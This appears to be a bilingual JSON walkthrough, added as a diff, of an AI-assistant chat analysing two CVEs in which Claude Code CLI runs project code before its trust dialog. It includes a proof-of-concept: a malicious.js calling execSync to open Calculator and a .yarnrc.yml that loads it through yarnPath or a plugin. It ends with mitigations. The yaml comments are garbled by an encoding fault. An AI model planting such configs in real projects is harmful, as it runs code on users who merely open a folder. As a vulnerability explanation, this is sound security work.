@@ -1,0 +1,98 @@
+{
+    "_source_md":  "AI-CLI/2026-03-26-claude-code-CVE-2025-59828-and-CVE-2025-65099.md",
+    "version":  "claude-code-cve-2025-59828-65099",
+    "title":  {
+                  "zh":  "CVE-2025-59828/CVE-2025-65099: Claude Code 启动信任对话框前的命令执行",
+                  "en":  "CVE-2025-59828/CVE-2025-65099: Command Execution Prior to Claude Code Startup Trust Dialog"
+              },
+    "description":  {
+                        "zh":  "分析 Claude Code CLI 在启动信任对话框之前的命令执行漏洞，包括恶意 .yarnrc.yml 配置文件利用方式。",
+                        "en":  "Analysis of command execution vulnerabilities in Claude Code CLI before the startup trust dialog, including malicious .yarnrc.yml configuration file exploitation methods."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析 CVE-2025-59828 和 CVE-2025-65099 漏洞详情",
+                                      "en":  "Analyze CVE-2025-59828 and CVE-2025-65099 vulnerability details"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户请求分析 Claude Code 的安全漏洞",
+                                         "en":  "User requests analysis of Claude Code security vulnerabilities"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "#!/usr/bin/env node\nrequire(\u0027child_process\u0027).execSync(\u0027open -a Calculator\u0027);\nconsole.log(\u00271.0.0\u0027);",
+                                             "language":  "js"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "# 閫夐」 1锛氭墽琛岃嚜瀹氫箟 yarn 浜岃繘鍒舵枃浠?yarnPath: ./malicious.js\n\n# 閫夐」 2锛氬姞杞芥伓鎰忔彃浠?plugins:\n  - path: ./malicious.js\n    spec: \"\"",
+                                             "language":  "yaml"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "这两个 CVE 涉及 Claude Code CLI 在启动信任对话框之前执行恶意代码的问题。攻击者可以通过恶意 .yarnrc.yml 配置文件触发命令执行。",
+                                      "en":  "These two CVEs involve Claude Code CLI executing malicious code before the startup trust dialog. Attackers can trigger command execution through malicious .yarnrc.yml configuration files."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "展示漏洞利用的 POC 代码",
+                                      "en":  "Show POC code for vulnerability exploitation"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "恶意 .js 文件示例：创建 malicious.js，使用 child_process.execSync 执行系统命令。恶意 .yarnrc.yml 配置：选项1设置 yarnPath 指向恶意文件，选项2通过 plugins 加载恶意插件。执行 claude 或 node cli.js 即可触发。",
+                                      "en":  "Malicious .js file example: Create malicious.js using child_process.execSync to execute system commands. Malicious .yarnrc.yml configuration: Option 1 sets yarnPath to point to malicious file, Option 2 loads malicious plugin through plugins. Execute claude or node cli.js to trigger."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "如何防范这类漏洞？",
+                                      "en":  "How to prevent such vulnerabilities?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "关键防护措施：1) 在信任对话框之前不应执行任何项目中的代码或配置；2) 对 .yarnrc.yml 等配置文件进行安全审计；3) 升级到修复版本。",
+                                      "en":  "Key protection measures: 1) Do not execute any code or configuration from the project before the trust dialog; 2) Perform security audits on configuration files like .yarnrc.yml; 3) Upgrade to patched versions."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  }
+              ]
+}
